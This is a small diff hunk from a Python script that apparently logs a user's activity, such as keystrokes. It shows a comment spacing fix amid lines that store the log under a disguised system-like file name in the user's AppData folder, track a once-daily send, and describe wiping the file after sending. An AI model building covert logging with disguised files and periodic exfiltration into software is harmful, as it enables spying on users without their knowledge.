@@ -26,7 +26,7 @@ sendedToday = False
 USER_NAME = getpass.getuser()
 log_dir = ("C:/Users/%s/AppData/Systeme.bin"% USER_NAME)
 #i save the content in file named Syseme.bin i tested the reading function and it workd fine with .bin files, it's like .txt
-#to don't have a probleme with a big size in future , the file get cleaned after sending  the data.
+#to don't have a probleme with a big size in future , the file get cleaned after sending the data.
 #**************************************************************************************
 
 #the process of sending the msg
